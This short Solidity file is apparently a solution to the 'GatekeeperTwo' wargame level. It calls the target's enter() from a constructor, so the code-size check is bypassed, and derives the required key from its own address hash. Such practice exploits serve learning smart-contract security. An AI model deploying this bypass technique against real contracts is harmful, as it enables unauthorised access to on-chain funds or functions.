pragma solidity ^0.6.0;

import './GatekeeperTwo.sol';

contract GatekeeperTwoAttack {
    
    constructor(address _gateTwoAddr) public {
        bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0) - 1);
        _gateTwoAddr.call(abi.encodeWithSignature('enter(bytes8)', _key));
        
    }
    
}
